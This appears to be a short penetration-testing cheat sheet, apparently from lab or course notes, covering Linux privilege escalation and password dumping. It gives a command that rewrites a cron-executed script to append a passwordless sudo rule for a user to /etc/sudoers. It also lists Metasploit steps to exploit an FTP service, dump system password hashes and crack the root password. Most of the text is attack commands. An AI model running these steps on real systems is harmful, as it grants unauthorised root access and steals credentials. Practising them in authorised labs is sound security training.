## Linux Kernel Exploit

Vulnerability detection tool : `https://github.com/The-Z-Labs/linux-exploit-suggester`


### CronJob

if no access to the binary with root privilege in unprivileged 

```bash
find / -name binary_name
```

```bash
printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
```

### SUID

## DUMPING LINUX PASSWORD HASHES

```bash
msfconsole -q
use exploit/unix/ftp/...
set RHOSTS x.x.x.x
exploit -z
```

1. use a post exploitation module to dump the system users hashes.
```bash
use post/linux/gather/hashdump
set SESSION 1
exploit
```

2. auxiliary module to find the plain text password of the root user.
```bash
use auxiliary/analyze/crack_linux
set SHA512 true
run
```